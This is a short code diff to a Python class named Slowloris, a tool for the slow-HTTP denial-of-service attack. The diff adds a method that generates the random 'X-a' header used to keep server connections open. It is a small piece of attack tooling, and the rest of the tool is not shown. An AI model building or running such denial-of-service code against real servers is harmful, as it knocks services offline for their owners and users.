@@ -260,7 +260,12 @@ class Slowloris:
         packet = f"Accept-language: {DefaultHttpParameters.Headers.accept_language}\r\n"
         return packet.encode("utf-8")
 
+    def create_xa_header(self) -> bytes:
+        """return the header for X-a"""
         
+        packet = f"X-a: {randint(1, 5000)}\r\n"
+        return packet.encode('utf-8')
+    
         
 if __name__ == "__main__":
     
